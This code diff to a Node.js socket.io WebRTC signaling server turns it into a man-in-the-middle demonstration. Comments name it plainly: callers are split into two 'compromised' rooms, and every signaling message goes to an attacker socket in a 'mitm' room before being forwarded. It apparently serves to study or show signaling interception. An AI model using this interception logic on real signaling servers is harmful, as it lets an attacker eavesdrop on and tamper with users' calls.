@@ -5,6 +5,10 @@ var nodeStatic = require('node-static');
 var http = require('http');
 var socketIO = require('socket.io');
 
+var compromisedroom1 = "bad1";//compromised room for caller 1
+var compromisedroom2 = "bad2";//compromised room for caller 2
+var numClients = 0;
+
 var fileServer = new(nodeStatic.Server)();
 var app = http.createServer(function(req, res) {
   fileServer.serve(req, res);
@@ -20,34 +24,64 @@ io.sockets.on('connection', function(socket) {
     socket.emit('log', array);
   }
 
-  socket.on('message', function(message) {
-    log('Client said: ', message);
+  //all messages filtered through attacker
+  socket.on('message', function(message, room) {
+    log('Attacker Sniffed: ', message);
+    socket.to("mitm").emit('sniff', message, room);
     // for a real app, would be room-only (not broadcast)
-    socket.broadcast.emit('message', message);
+    //socket.broadcast.emit('message', message);
   });
 
+  //attacker forwards message to the correct room
+  socket.on('forward', function(message, room) {
+    log('Attacker forwarded: ', message);
+    var compromisedroom = (room === compromisedroom1)? compromisedroom2 : compromisedroom1;
+    try{
+      socket.to(compromisedroom).emit('message', message);
+    }catch(e){
+      log(e);//debug for when 2nd room not yet open
+    }
+  });
+
+  //Shim function for setting streams -- Not operating currently
+  // socket.on('stream', function(stream) {
+  //   socket.to(mitm).emit('captured stream', stream);
+  // });
+
+
   socket.on('create or join', function(room) {
+    //MiTM
+    if(room === "mitm"){
+      socket.join(room);
+      socket.emit("set attacker");
+    }else{
+    
     log('Received request to create or join room ' + room);
 
-    var clientsInRoom = io.sockets.adapter.rooms[room];
-    var numClients = clientsInRoom ? Object.keys(clientsInRoom.sockets).length : 0;
+   // var clientsInRoom = io.sockets.adapter.rooms[room];
+    //var numClients = clientsInRoom ? Object.keys(clientsInRoom.sockets).length : 0; 
+    //delted as we now separate into rooms
     log('Room ' + room + ' now has ' + numClients + ' client(s)');
 
     if (numClients === 0) {
+      room = compromisedroom1;
       socket.join(room);
       log('Client ID ' + socket.id + ' created room ' + room);
       socket.emit('created', room, socket.id);
+      numClients++;
 
     } else if (numClients === 1) {
+      room = compromisedroom2;
       log('Client ID ' + socket.id + ' joined room ' + room);
-      io.sockets.in(room).emit('join', room);
+      io.sockets.in(compromisedroom1).emit('join', compromisedroom1);//I think we need to signal to first room to kick off process
       socket.join(room);
       socket.emit('joined', room, socket.id);
       io.sockets.in(room).emit('ready');
+      numClients++;
     } else { // max two clients
       socket.emit('full', room);
     }
-  });
+  }});
 
   socket.on('ipaddr', function() {
     var ifaces = os.networkInterfaces();
@@ -62,6 +96,7 @@ io.sockets.on('connection', function(socket) {
 
   socket.on('bye', function(){
     console.log('received bye');
+    numClients--;
   });
 
 });
